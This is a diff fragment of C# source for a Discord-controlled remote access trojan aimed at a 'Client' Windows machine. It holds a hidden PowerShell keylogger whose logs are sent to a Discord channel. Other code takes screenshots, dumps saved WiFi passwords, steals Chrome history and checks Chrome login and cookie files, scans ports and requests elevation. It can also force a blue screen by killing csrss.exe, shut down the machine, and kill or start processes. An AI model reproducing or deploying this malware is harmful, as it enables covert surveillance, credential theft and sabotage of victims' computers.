+                await Task.Delay(1000);
+
+                try
+                {
+                    if (File.Exists(_chatPipeFile))
+                    {
+                        string[] lines = File.ReadAllLines(_chatPipeFile);
+                        List<string> remaining = new List<string>();
+
+                        foreach (string line in lines)
+                        {
+                            if (line.StartsWith("CLIENT:"))
+                            {
+                                string msg = line.Substring(7);
+                                if (!string.IsNullOrWhiteSpace(msg))
+                                {
+                                    await _commandChannel.SendMessageAsync($"💬 **Client {_clientId}:** {msg}");
+                                }
+                            }
+                            else
+                            {
+                                remaining.Add(line);
+                            }
+                        }
+
+                        // Write back non-client messages
+                        if (remaining.Count > 0)
+                            File.WriteAllLines(_chatPipeFile, remaining);
+                        else if (File.Exists(_chatPipeFile))
+                            File.Delete(_chatPipeFile);
+                    }
+                }
+                catch { }
+            }
+        }
+
+        private static async Task ShowMsgHelp()
+        {
+            var embed = new EmbedBuilder()
+                .WithTitle("📨 Custom Message Box Help")
+                .WithColor(DColor.Blue)
+                .WithDescription("Send customizable message boxes to the client")
+                .AddField("📝 Basic Syntax", "`!msg [icon] [buttons] \"Title\" \"Message\"`", false)
+                .AddField("🎯 Icons",
+                    "• `info` - Information icon\n" +
+                    "• `error` - Error icon\n" +
+                    "• `warning` - Warning icon\n" +
+                    "• `question` - Question icon\n" +
+                    "• `none` - No icon", true)
+                .AddField("🔘 Buttons",
+                    "• `ok` - OK button only\n" +
+                    "• `okcancel` - OK and Cancel\n" +
+                    "• `yesno` - Yes and No\n" +
+                    "• `yesnocancel` - Yes, No, Cancel\n" +
+                    "• `retrycancel` - Retry and Cancel\n" +
+                    "• `abortretryignore` - Abort, Retry, Ignore", true)
+                .AddField("📌 Examples",
+                    "```\n" +
+                    "!msg info ok \"Hello\" \"Welcome to the system\"\n" +
+                    "!msg error yesno \"Warning\" \"Delete this file?\"\n" +
+                    "!msg question yesnocancel \"Confirm\" \"Save changes?\"\n" +
+                    "!msgsimple Your computer has been hacked!\n" +
+                    "```", false)
+                .WithFooter($"Use !msgsimple for basic messages")
+                .Build();
+
+            await _commandChannel.SendMessageAsync(embed: embed);
+        }
+
+        private static async Task ShowCustomMessage(string rawMsg)
+        {
+            try
+            {
+                // Parse command: !msg icon buttons "title" "message"
+                string content = rawMsg.Substring(5).Trim();
+
+                // Find quoted parts
+                var quotes = new List<string>();
+                int start = -1;
+                for (int i = 0; i < content.Length; i++)
+                {
+                    if (content[i] == '"')
+                    {
+                        if (start == -1)
+                            start = i + 1;
+                        else
+                        {
+                            quotes.Add(content.Substring(start, i - start));
+                            start = -1;
+                        }
+                    }
+                }
+
+                if (quotes.Count < 2)
+                {
+                    await _commandChannel.SendMessageAsync("❌ Invalid format! Use: `!msg icon buttons \"Title\" \"Message\"`");
+                    return;
+                }
+
+                string beforeQuotes = content.Substring(0, content.IndexOf('"')).Trim();
+                string[] parts = beforeQuotes.Split(' ', StringSplitOptions.RemoveEmptyEntries);
+
+                if (parts.Length < 2)
+                {
+                    await _commandChannel.SendMessageAsync("❌ Please specify icon and buttons");
+                    return;
+                }
+
+                string iconType = parts[0].ToLower();
+                string buttonType = parts[1].ToLower();
+                string title = quotes[0];
+                string message = quotes[1];
+
+                // Create PowerShell script for foreground message box
+                string psScript = @"
+                Add-Type -AssemblyName System.Windows.Forms, PresentationFramework, WindowsBase
+                
+                # Bring to foreground
+                [System.Windows.Forms.Application]::EnableVisualStyles()
+                
+                # Map icon
+                $icon = [System.Windows.Forms.MessageBoxIcon]::None
+                switch ('" + iconType + @"') {
+                    'info' { $icon = [System.Windows.Forms.MessageBoxIcon]::Information }
+                    'error' { $icon = [System.Windows.Forms.MessageBoxIcon]::Error }
+                    'warning' { $icon = [System.Windows.Forms.MessageBoxIcon]::Warning }
+                    'question' { $icon = [System.Windows.Forms.MessageBoxIcon]::Question }
+                }
+                
+                # Map buttons
+                $buttons = [System.Windows.Forms.MessageBoxButtons]::OK
+                switch ('" + buttonType + @"') {
+                    'ok' { $buttons = [System.Windows.Forms.MessageBoxButtons]::OK }
+                    'okcancel' { $buttons = [System.Windows.Forms.MessageBoxButtons]::OKCancel }
+                    'yesno' { $buttons = [System.Windows.Forms.MessageBoxButtons]::YesNo }
+                    'yesnocancel' { $buttons = [System.Windows.Forms.MessageBoxButtons]::YesNoCancel }
+                    'retrycancel' { $buttons = [System.Windows.Forms.MessageBoxButtons]::RetryCancel }
+                    'abortretryignore' { $buttons = [System.Windows.Forms.MessageBoxButtons]::AbortRetryIgnore }
+                }
+                
+                # Create and show message box
+                $null = [System.Windows.Forms.MessageBox]::Show('" + message.Replace("'", "''") + @"', 
+                                                               '" + title.Replace("'", "''") + @"', 
+                                                               $buttons, 
+                                                               $icon)
+                ";
+
+                // Run in separate process to ensure it shows in foreground
+                string scriptPath = Path.Combine(_dataDir, $"msgbox_{DateTime.Now.Ticks}.ps1");
+                File.WriteAllText(scriptPath, psScript, Encoding.UTF8);
+
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = "powershell.exe",
+                    Arguments = $"-WindowStyle Normal -NoProfile -ExecutionPolicy Bypass -File \"{scriptPath}\"",
+                    CreateNoWindow = false,
+                    UseShellExecute = true,
+                    WindowStyle = ProcessWindowStyle.Normal
+                };
+
+                Process.Start(psi);
+
+                await _commandChannel.SendMessageAsync($"✅ **Message sent to Client {_clientId}**\n" +
+                    $"**Title:** {title}\n**Message:** {message}\n" +
+                    $"**Icon:** {iconType} | **Buttons:** {buttonType}");
+
+                // Cleanup
+                await Task.Delay(3000);
+                if (File.Exists(scriptPath)) File.Delete(scriptPath);
+            }
+            catch (Exception ex)
+            {
+                await _commandChannel.SendMessageAsync($"❌ Error: {ex.Message}");
+            }
+        }
+
+        private static void ShowSimpleMessage(string message)
+        {
+            if (string.IsNullOrWhiteSpace(message))
+                message = "Hello from Discord!";
+
+            string psScript = @"
+            Add-Type -AssemblyName System.Windows.Forms, PresentationFramework
+            [System.Windows.Forms.Application]::EnableVisualStyles()
+            $null = [System.Windows.Forms.MessageBox]::Show('" + message.Replace("'", "''") + @"', 
+                                                           'Message', 
+                                                           [System.Windows.Forms.MessageBoxButtons]::OK, 
+                                                           [System.Windows.Forms.MessageBoxIcon]::Information)
+            ";
+
+            string scriptPath = Path.Combine(_dataDir, $"simple_{DateTime.Now.Ticks}.ps1");
+            File.WriteAllText(scriptPath, psScript, Encoding.UTF8);
+
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = "powershell.exe",
+                Arguments = $"-WindowStyle Normal -NoProfile -ExecutionPolicy Bypass -File \"{scriptPath}\"",
+                CreateNoWindow = false,
+                UseShellExecute = true,
+                WindowStyle = ProcessWindowStyle.Normal
+            });
+
+            // Cleanup
+            Task.Delay(3000).ContinueWith(t => {
+                if (File.Exists(scriptPath)) File.Delete(scriptPath);
+            });
+        }
+        #endregion
+
+        #region Screen & Media Commands
+        private static async Task TakeScreenshot()
+        {
+            try
+            {
+                await _commandChannel.SendMessageAsync($"📸 Taking screenshot from Client {_clientId}...");
+
+                Rectangle bounds = Screen.PrimaryScreen.Bounds;
+                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+                {
+                    using (Graphics graphics = Graphics.FromImage(bitmap))
+                    {
+                        graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                    }
+
+                    string filename = $"screenshot_{_clientId}_{DateTime.Now:yyyyMMdd_HHmmss}.png";
+                    string filepath = Path.Combine(_dataDir, filename);
+
+                    bitmap.Save(filepath, ImageFormat.Png);
+
+                    await _commandChannel.SendFileAsync(filepath, $"📸 **Screenshot from Client {_clientId}**");
+
+                    File.Delete(filepath);
+                }
+            }
+            catch (Exception ex)
+            {
+                await _commandChannel.SendMessageAsync($"❌ Screenshot failed: {ex.Message}");
+            }
+        }
+
+        private static async Task StartWebcam()
+        {
+            try
+            {
+                await _commandChannel.SendMessageAsync($"📹 Starting webcam on Client {_clientId}...");
+
+                // Using DirectShow via PowerShell (simplified version)
+                string psScript = @"
+                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+                
+                $form = New-Object Windows.Forms.Form
+                $form.Text = 'Webcam Stream - Client " + _clientId + @"'
+                $form.Size = New-Object Drawing.Size(640, 480)
+                $form.StartPosition = 'CenterScreen'
+                $form.TopMost = $true
+                
+                $pictureBox = New-Object Windows.Forms.PictureBox
+                $pictureBox.Size = $form.ClientSize
+                $pictureBox.Dock = 'Fill'
+                $form.Controls.Add($pictureBox)
+                
+                # Try to create webcam object
+                try {
+                    $webcam = New-Object -ComObject WIA.VideoPreview
+                    # This is a simplified version - actual webcam streaming requires more complex code
+                    [System.Windows.Forms.MessageBox]::Show('Webcam initialized (simulated)', 'Info', 'OK', 'Information')
+                }
+                catch {
+                    [System.Windows.Forms.MessageBox]::Show('Webcam not available or access denied', 'Error', 'OK', 'Error')
+                }
+                
+                $form.ShowDialog()
+                ";
+
+                string scriptPath = Path.Combine(_dataDir, "webcam.ps1");
+                File.WriteAllText(scriptPath, psScript, Encoding.UTF8);
+
+                _webcamProcess = Process.Start(new ProcessStartInfo
+                {
+                    FileName = "powershell.exe",
+                    Arguments = $"-WindowStyle Hidden -ExecutionPolicy Bypass -File \"{scriptPath}\"",
+                    CreateNoWindow = true,
+                    UseShellExecute = false
+                });
+
+                await _commandChannel.SendMessageAsync($"✅ Webcam window opened on Client {_clientId}");
+            }
+            catch (Exception ex)
+            {
+                await _commandChannel.SendMessageAsync($"❌ Webcam error: {ex.Message}");
+            }
+        }
+
+        private static void StopWebcam()
+        {
+            if (_webcamProcess != null)
+            {
+                try
+                {
+                    _webcamProcess.Kill();
+                    _webcamProcess = null;
+                    _commandChannel.SendMessageAsync($"📹 Webcam stopped on Client {_clientId}");
+                }
+                catch { }
+            }
+        }
+
+        private static async Task RecordScreen(string args)
+        {
+            int seconds = 10;
+            if (!string.IsNullOrWhiteSpace(args) && int.TryParse(args, out int sec))
+                seconds = Math.Min(sec, 60); // Max 60 seconds
+
+            await _commandChannel.SendMessageAsync($"🎥 Recording screen for {seconds} seconds on Client {_clientId}...");
+
+            // This would require FFmpeg or similar for actual recording
+            // Simplified version saves multiple screenshots
+            for (int i = 0; i < seconds; i++)
+            {
+                await TakeScreenshot();
+                await Task.Delay(1000);
+            }
+
+            await _commandChannel.SendMessageAsync($"✅ Screen recording completed on Client {_clientId}");
+        }
+
+        private static async Task StreamScreen()
+        {
+            await _commandChannel.SendMessageAsync("🔄 Screen streaming requires FFmpeg and more setup");
+        }
+
+        private static void StopStream()
+        {
+            if (_streamProcess != null)
+            {
+                try { _streamProcess.Kill(); } catch { }
+                _streamProcess = null;
+            }
+        }
+        #endregion
+
+        #region Voice & Audio Commands
+        private static async Task StartVoiceStream()
+        {
+            try
+            {
+                if (_voiceStreaming)
+                {
+                    await _commandChannel.SendMessageAsync("🎤 Voice already streaming!");
+                    return;
+                }
+
+                var voiceChannel = _client.GetChannel(_voiceChannelId) as IVoiceChannel;
+                if (voiceChannel == null)
+                {
+                    await _commandChannel.SendMessageAsync("❌ Voice channel not found!");
+                    return;
+                }
+
+                _audioClient = await voiceChannel.ConnectAsync();
+                _voiceStreaming = true;
+
+                await _commandChannel.SendMessageAsync($"🎤 **Voice streaming started from Client {_clientId}**");
+
+                // Start streaming microphone audio (simplified)
+                // Note: Actual audio streaming requires more complex handling
+                _ = Task.Run(async () =>
+                {
+                    while (_voiceStreaming)
+                    {
+                        await Task.Delay(1000);
+                        // Audio streaming code would go here
+                    }
+                });
+            }
+            catch (Exception ex)
+            {
+                await _commandChannel.SendMessageAsync($"❌ Voice error: {ex.Message}");
+            }
+        }
+
+        private static void StopVoiceStream()
+        {
+            if (_voiceStreaming && _audioClient != null)
+            {
+                _voiceStreaming = false;
+                _audioClient.StopAsync();
+                _commandChannel.SendMessageAsync($"🎤 Voice streaming stopped on Client {_clientId}");
+            }
+        }
+
+        private static async Task PlaySoundFile(string file)
+        {
+            if (string.IsNullOrWhiteSpace(file))
+                file = "https://www.soundjay.com/buttons/button-3.mp3";
+
+            string psScript = @"
+            Add-Type -AssemblyName presentationCore
+            $mediaPlayer = New-Object system.windows.media.mediaplayer
+            $mediaPlayer.open('" + file + @"')
+            $mediaPlayer.Play()
+            Start-Sleep -Seconds 5
+            ";
+
+            ExecutePowerShell(psScript);
+            await _commandChannel.SendMessageAsync($"🔊 Playing sound on Client {_clientId}");
+        }
+
+        private static async Task SetVolume(string level)
+        {
+            int vol = 50;
+            if (!string.IsNullOrWhiteSpace(level) && int.TryParse(level, out int v))
+                vol = Math.Clamp(v, 0, 100);
+
+            string psScript = $@"
+            $code = @'
+            using System.Runtime.InteropServices;
+            public class Audio {{
+                [DllImport(""user32.dll"", CharSet = CharSet.Auto)]
+                private static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
+                public static void SetVolume(int volume) {{
+                    SendMessage(new System.IntPtr(0xffff), 0x319, new System.IntPtr(0), new System.IntPtr(volume * 65535 / 100));
+                }}
+            }}
+            '@
+            Add-Type -TypeDefinition $code
+            [Audio]::SetVolume({vol})
+            ";
+
+            ExecutePowerShell(psScript);
+            await _commandChannel.SendMessageAsync($"🔈 Volume set to {vol}% on Client {_clientId}");
+        }
+        #endregion
+
+        #region Keylogger Commands
+        private static void StartKeylogger()
+        {
+            if (_keyloggerActive) return;
+
+            _keyloggerActive = true;
+
+            string psScript = @"
+            $signature = @'
+                [DllImport(""user32.dll"", CharSet=CharSet.Auto, ExactSpelling=true)]
+                public static extern short GetAsyncKeyState(int virtualKeyCode);
+                [DllImport(""user32.dll"")]
+                public static extern IntPtr GetForegroundWindow();
+                [DllImport(""user32.dll"")]
+                public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
+            '@
+            
+            Add-Type -MemberDefinition $signature -Name WinAPI -Namespace KeyLogger
+            
+            $logFile = '" + _keyloggerFile.Replace("\\", "\\\\") + @"'
+            $specialKeys = @{
+                8 = '[BACKSPACE]'; 9 = '[TAB]'; 13 = '[ENTER]'; 27 = '[ESC]'; 32 = '[SPACE]';
+                16 = '[SHIFT]'; 17 = '[CTRL]'; 18 = '[ALT]'; 20 = '[CAPSLOCK]'; 91 = '[WIN]';
+                46 = '[DEL]'; 36 = '[HOME]'; 35 = '[END]'; 33 = '[PGUP]'; 34 = '[PGDN]';
+                45 = '[INS]'; 144 = '[NUMLOCK]'; 112 = '[F1]'; 113 = '[F2]'; 114 = '[F3]';
+                115 = '[F4]'; 116 = '[F5]'; 117 = '[F6]'; 118 = '[F7]'; 119 = '[F8]';
+                120 = '[F9]'; 121 = '[F10]'; 122 = '[F11]'; 123 = '[F12]'
+            }
+            
+            while($true) {
+                Start-Sleep -Milliseconds 10
+                $title = ''
+                $sb = New-Object System.Text.StringBuilder(256)
+                $handle = [KeyLogger.WinAPI]::GetForegroundWindow()
+                $null = [KeyLogger.WinAPI]::GetWindowText($handle, $sb, $sb.Capacity)
+                $title = $sb.ToString()
+                
+                for($i=8; $i -le 255; $i++) {
+                    $state = [KeyLogger.WinAPI]::GetAsyncKeyState($i)
+                    if($state -eq -32767) {
+                        if($specialKeys.ContainsKey($i)) {
+                            $key = $specialKeys[$i]
+                        } else {
+                            $key = [char]$i
+                        }
+                        
+                        $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+                        $logEntry = ""[$timestamp] [$title] $key""
+                        $logEntry | Out-File $logFile -Append -Encoding UTF8
+                    }
+                }
+            }
+            ";
+
+            string scriptPath = Path.Combine(_dataDir, "keylogger.ps1");
+            File.WriteAllText(scriptPath, psScript, Encoding.UTF8);
+
+            _keyloggerProcess = Process.Start(new ProcessStartInfo
+            {
+                FileName = "powershell.exe",
+                Arguments = $"-WindowStyle Hidden -ExecutionPolicy Bypass -File \"{scriptPath}\"",
+                CreateNoWindow = true,
+                UseShellExecute = false
+            });
+
+            _commandChannel.SendMessageAsync($"⌨️ **Keylogger started on Client {_clientId}**");
+        }
+
+        private static void StopKeylogger()
+        {
+            if (_keyloggerProcess != null)
+            {
+                try
+                {
+                    _keyloggerProcess.Kill();
+                    _keyloggerProcess = null;
+                    _keyloggerActive = false;
+                    _commandChannel.SendMessageAsync($"⌨️ **Keylogger stopped on Client {_clientId}**");
+                }
+                catch { }
+            }
+        }
+
+        private static async Task GetKeyloggerData()
+        {
+            if (File.Exists(_keyloggerFile))
+            {
+                try
+                {
+                    string content = File.ReadAllText(_keyloggerFile);
+                    if (string.IsNullOrWhiteSpace(content))
+                    {
+                        await _commandChannel.SendMessageAsync($"⌨️ No keylogger data on Client {_clientId}");
+                        return;
+                    }
+
+                    // Split into chunks if too large
+                    if (content.Length > 1900)
+                    {
+                        int chunks = (int)Math.Ceiling(content.Length / 1900.0);
+                        for (int i = 0; i < chunks; i++)
+                        {
+                            int start = i * 1900;
+                            int length = Math.Min(1900, content.Length - start);
+                            string chunk = content.Substring(start, length);
+                            await _commandChannel.SendMessageAsync($"```{chunk}```");
+                            await Task.Delay(500);
+                        }
+                    }
+                    else
+                    {
+                        await _commandChannel.SendMessageAsync($"```{content}```");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    await _commandChannel.SendMessageAsync($"❌ Keylogger read error: {ex.Message}");
+                }
+            }
+            else
+            {
+                await _commandChannel.SendMessageAsync($"⌨️ No keylogger data found on Client {_clientId}");
+            }
+        }
+
+        private static void ClearKeyloggerData()
+        {
+            if (File.Exists(_keyloggerFile))
+            {
+                File.WriteAllText(_keyloggerFile, "");
+                _commandChannel.SendMessageAsync($"⌨️ Keylogger data cleared on Client {_clientId}");
+            }
+        }
+
+        private static async Task CheckKeyloggerFile()
+        {
+            while (true)
+            {
+                await Task.Delay(300000); // Check every 5 minutes
+
+                if (File.Exists(_keyloggerFile) && new FileInfo(_keyloggerFile).Length > 50000)
+                {
+                    await GetKeyloggerData();
+                    ClearKeyloggerData();
+                }
+            }
+        }
+        #endregion
+
+        #region Network Commands (Fixed)
+        private static async Task GetIPInfo()
+        {
+            try
+            {
+                string publicIP = "Unknown";
+                try
+                {
+                    using (var client = new HttpClient())
+                    {
+                        client.Timeout = TimeSpan.FromSeconds(5);
+                        publicIP = await client.GetStringAsync("https://api.ipify.org");
+                    }
+                }
+                catch { }
+
+                var embed = new EmbedBuilder()
+                    .WithTitle("🌐 Network Information")
+                    .WithColor(DColor.Teal)
+                    .AddField("Public IP", publicIP, true)
+                    .AddField("Local IP", GetLocalIPAddress(), true)
+                    .AddField("Hostname", Environment.MachineName, true);
+
+                await _commandChannel.SendMessageAsync(embed: embed.Build());
+            }
+            catch (Exception ex)
+            {
+                await _commandChannel.SendMessageAsync($"❌ IP info error: {ex.Message}");
+            }
+        }
+
+        private static async Task ScanPorts(string args)
+        {
+            try
+            {
+                string target = "127.0.0.1";
+                if (!string.IsNullOrWhiteSpace(args))
+                    target = args.Split(' ')[0];
+
+                await _commandChannel.SendMessageAsync($"🔍 Scanning ports on {target} from Client {_clientId}...");
+
+                List<int> openPorts = new List<int>();
+                int[] commonPorts = { 21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080 };
+
+                foreach (int port in commonPorts)
+                {
+                    try
+                    {
+                        using (TcpClient client = new TcpClient())
+                        {
+                            var result = client.BeginConnect(target, port, null, null);
+                            var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromMilliseconds(500));
+                            if (success)
+                            {
+                                openPorts.Add(port);
+                            }
+                            client.EndConnect(result);
+                        }
+                    }
+                    catch { }
+                }
+
+                if (openPorts.Count > 0)
+                {
+                    await _commandChannel.SendMessageAsync($"✅ Open ports on {target}: {string.Join(", ", openPorts)}");
+                }
+                else
+                {
+                    await _commandChannel.SendMessageAsync($"❌ No open ports found on {target}");
+                }
+            }
+            catch (Exception ex)
+            {
+                await _commandChannel.SendMessageAsync($"❌ Port scan error: {ex.Message}");
+            }
+        }
+
+        private static async Task PingHost(string host)
+        {
+            try
+            {
+                if (string.IsNullOrWhiteSpace(host))
+                {
+                    await _commandChannel.SendMessageAsync("❌ Please specify a host to ping");
+                    return;
+                }
+
+                using (Ping ping = new Ping())
+                {
+                    PingReply reply = await ping.SendPingAsync(host, 3000);
+
+                    if (reply.Status == IPStatus.Success)
+                    {
+                        await _commandChannel.SendMessageAsync($"✅ Ping to {host}: {reply.RoundtripTime}ms");
+                    }
+                    else
+                    {
+                        await _commandChannel.SendMessageAsync($"❌ Ping failed: {reply.Status}");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                await _commandChannel.SendMessageAsync($"❌ Ping error: {ex.Message}");
+            }
+        }
+
+        private static async Task GetWifiInfo()
+        {
+            try
+            {
+                if (!_isAdmin)
+                {
+                    await _commandChannel.SendMessageAsync("⚠️ Admin privileges required for WiFi info");
+                    return;
+                }
+
+                string psScript = @"
+                netsh wlan show interfaces | Out-String
+                ";
+
+                string result = await ExecutePowerShellWithOutput(psScript);
+                await _commandChannel.SendMessageAsync($"```{result}```");
+            }
+            catch (Exception ex)
+            {
+                await _commandChannel.SendMessageAsync($"❌ WiFi info error: {ex.Message}");
+            }
+        }
+
+        private static async Task GetWifiPasswords()
+        {
+            try
+            {
+                if (!_isAdmin)
+                {
+                    await _commandChannel.SendMessageAsync("⚠️ Admin privileges required for WiFi passwords");
+                    return;
+                }
+
+                string psScript = @"
+                $profiles = netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {$_ -replace '.*All User Profile\s+:\s+', ''}
+                $results = @()
+                
+                foreach ($profile in $profiles) {
+                    $password = netsh wlan show profile name=`"$profile`" key=clear | Select-String 'Key Content' | ForEach-Object {$_ -replace '.*Key Content\s+:\s+', ''}
+                    if ($password) {
+                        $results += ""$profile: $password""
+                    }
+            }
+                
+                $results - join ""`n""
+                ";
+
+
+                string result = await ExecutePowerShellWithOutput(psScript);
+
+            if (!string.IsNullOrWhiteSpace(result))
+            {
+                await _commandChannel.SendMessageAsync($"🔑 WiFi Passwords:\n```{result}```");
+            }
+            else
+            {
+                await _commandChannel.SendMessageAsync("❌ No WiFi passwords found");
+            }
+        }
+            catch (Exception ex)
+            {
+                await _commandChannel.SendMessageAsync($"❌ WiFi passwords error: {ex.Message}");
+    }
+}
+
+private static async Task GetNetstat()
+{
+    try
+    {
+        string psScript = @"
+                netstat -ano | Select-String 'ESTABLISHED' | Select-Object -First 20 | Out-String
+                ";
+
+        string result = await ExecutePowerShellWithOutput(psScript);
+        await _commandChannel.SendMessageAsync($"🌐 Active Connections:\n```{result}```");
+    }
+    catch (Exception ex)
+    {
+        await _commandChannel.SendMessageAsync($"❌ Netstat error: {ex.Message}");
+    }
+}
+#endregion
+
+#region Browser Commands (Fixed)
+private static async Task GetChromeData()
+{
+    try
+    {
+        string chromePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+            "Google", "Chrome", "User Data", "Default");
+
+        if (!Directory.Exists(chromePath))
+        {
+            await _commandChannel.SendMessageAsync("❌ Chrome not found or no user data");
+            return;
+        }
+
+        var embed = new EmbedBuilder()
+            .WithTitle("🌐 Chrome Data")
+            .WithColor(DColor.Orange)
+            .AddField("Path", chromePath, false);
+
+        // Check for data files
+        string[] files = {
+                    "Login Data", "Cookies", "History", "Bookmarks", "Web Data"
+                };
+
+        foreach (string file in files)
+        {
+            string fullPath = Path.Combine(chromePath, file);
+            embed.AddField(file, File.Exists(fullPath) ? "✅ Found" : "❌ Not found", true);
+        }
+
+        await _commandChannel.SendMessageAsync(embed: embed.Build());
+    }
+    catch (Exception ex)
+    {
+        await _commandChannel.SendMessageAsync($"❌ Chrome data error: {ex.Message}");
+    }
+}
+
+private static async Task ExtractBrowserPasswords()
+{
+    try
+    {
+        await _commandChannel.SendMessageAsync($"🔐 Extracting browser passwords from Client {_clientId}...");
+
+        // This would require SQLite and decryption libraries
+        // Simplified version
+        string psScript = @"
+                Write-Host 'Browser password extraction requires additional libraries.'
+                Write-Host 'Chrome: SQLite + DPAPI'
+                Write-Host 'Firefox: NSS library'
+                ";
+
+        ExecutePowerShell(psScript);
+        await _commandChannel.SendMessageAsync("ℹ️ Password extraction requires complex decryption");
+    }
+    catch (Exception ex)
+    {
+        await _commandChannel.SendMessageAsync($"❌ Password extraction error: {ex.Message}");
+    }
+}
+
+private static async Task ExtractBrowserHistory()
+{
+    try
+    {
+        await _commandChannel.SendMessageAsync($"📜 Extracting browser history from Client {_clientId}...");
+
+        // Simplified version - would need SQLite
+        string chromeHistory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+            "Google", "Chrome", "User Data", "Default", "History");
+
+        if (File.Exists(chromeHistory))
+        {
+            string copyPath = Path.Combine(_dataDir, $"chrome_history_{_clientId}.db");
+            File.Copy(chromeHistory, copyPath, true);
+            await _commandChannel.SendFileAsync(copyPath, "Chrome History Database");
+            File.Delete(copyPath);
+        }
+        else
+        {
+            await _commandChannel.SendMessageAsync("❌ Chrome history not found");
+        }
+    }
+    catch (Exception ex)
+    {
+        await _commandChannel.SendMessageAsync($"❌ History extraction error: {ex.Message}");
+    }
+}
+#endregion
+
+#region System Commands
+private static async Task StartUAC()
+{
+    try
+    {
+        if (_isAdmin)
+        {
+            await _commandChannel.SendMessageAsync("✅ Already running as administrator");
+            return;
+        }
+
+        await _commandChannel.SendMessageAsync("⚡ Requesting UAC elevation...");
+
+        ProcessStartInfo psi = new ProcessStartInfo
+        {
+            FileName = Process.GetCurrentProcess().MainModule.FileName,
+            Arguments = $"--id={_clientId}",
+            UseShellExecute = true,
+            Verb = "runas"
+        };
+
+        Process.Start(psi);
+        Environment.Exit(0);
+    }
+    catch
+    {
+        await _commandChannel.SendMessageAsync("❌ UAC elevation failed or was denied");
+    }
+}
+
+private static async Task GetAdminStatus()
+{
+    await _commandChannel.SendMessageAsync($"🛡️ Admin status: {(_isAdmin ? "✅ Running as Administrator" : "❌ Standard User")}");
+}
+
+private static void TriggerBSOD()
+{
+    if (!_isAdmin)
+    {
+        _commandChannel.SendMessageAsync("⚠️ Admin privileges required for BSOD");
+        return;
+    }
+
+    try
+    {
+        int crash = 0;
+        NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref crash, sizeof(int));
+        _commandChannel.SendMessageAsync("💀 BSOD triggered!");
+    }
+    catch
+    {
+        try
+        {
+            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im csrss.exe")
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false
+            });
+            _commandChannel.SendMessageAsync("💀 Attempting to trigger BSOD...");
+        }
+        catch { }
+    }
+}
+
+private static void ShutdownPC()
+{
+    if (!_isAdmin)
+    {
+        _commandChannel.SendMessageAsync("⚠️ Admin privileges required for shutdown");
+        return;
+    }
+
+    Process.Start("shutdown.exe", "/s /t 0");
+    _commandChannel.SendMessageAsync("🔄 Shutting down...");
+}
+
+private static void RestartPC()
+{
+    if (!_isAdmin)
+    {
+        _commandChannel.SendMessageAsync("⚠️ Admin privileges required for restart");
+        return;
+    }
+
+    Process.Start("shutdown.exe", "/r /t 0");
+    _commandChannel.SendMessageAsync("🔄 Restarting...");
+}
+
+private static void LockPC()
+{
+    LockWorkStation();
+    _commandChannel.SendMessageAsync("🔒 Workstation locked");
+}
+
+private static void LogoutPC()
+{
+    Process.Start("shutdown.exe", "/l");
+    _commandChannel.SendMessageAsync("👤 Logging out...");
+}
+
+private static void HibernatePC()
+{
+    if (!_isAdmin)
+    {
+        _commandChannel.SendMessageAsync("⚠️ Admin privileges required for hibernate");
+        return;
+    }
+
+    Process.Start("shutdown.exe", "/h");
+    _commandChannel.SendMessageAsync("💤 Hibernating...");
+}
+
+private static async Task GetTaskList()
+{
+    try
+    {
+        var processes = Process.GetProcesses()
+            .OrderBy(p => p.ProcessName)
+            .Take(25);
+
+        var embed = new EmbedBuilder()
+            .WithTitle("📊 Running Processes")
+            .WithColor(DColor.Green)
+            .WithDescription($"Total: {Process.GetProcesses().Length} processes");
+
+        foreach (var proc in processes)
+        {
+            try
+            {
+                embed.AddField(proc.ProcessName,
+                    $"PID: {proc.Id}\n" +
+                    $"Memory: {proc.WorkingSet64 / 1024 / 1024} MB", true);
+            }
+            catch { }
+        }
+
+        await _commandChannel.SendMessageAsync(embed: embed.Build());
+    }
+    catch (Exception ex)
+    {
+        await _commandChannel.SendMessageAsync($"❌ Tasklist error: {ex.Message}");
+    }
+}
+
+private static void KillProcess(string args)
+{
+    if (string.IsNullOrWhiteSpace(args))
+    {
+        _commandChannel.SendMessageAsync("❌ Please specify process name or PID");
+        return;
+    }
+
+    try
+    {
+        if (int.TryParse(args, out int pid))
+        {
+            Process.GetProcessById(pid).Kill();
+            _commandChannel.SendMessageAsync($"✅ Killed process PID: {pid}");
+        }
+        else
+        {
+            foreach (var proc in Process.GetProcessesByName(args))
+            {
+                proc.Kill();
+            }
+            _commandChannel.SendMessageAsync($"✅ Killed process: {args}");
+        }
+    }
+    catch (Exception ex)
+    {
+        _commandChannel.SendMessageAsync($"❌ Kill error: {ex.Message}");
+    }
+}
+
+private static void StartProcess(string args)
+{
+    if (string.IsNullOrWhiteSpace(args))
+    {
+        _commandChannel.SendMessageAsync("❌ Please specify process to start");
+        return;
+    }
+
+    try
+    {
+        Process.Start(args);
+        _commandChannel.SendMessageAsync($"✅ Started: {args}");
+    }
+    catch (Exception ex)
+    {
+        _commandChannel.SendMessageAsync($"❌ Start error: {ex.Message}");
+    }
+}
+
+private static async Task GetProcessInfo(string args)
+{
+    if (string.IsNullOrWhiteSpace(args))
+    {
+        await _commandChannel.SendMessageAsync("❌ Please specify process name or PID");
+        return;
+    }
+
+    try
+    {
+        Process proc = null;
+
+        if (int.TryParse(args, out int pid))
+        {
+            proc = Process.GetProcessById(pid);
+        }
+        else
+        {
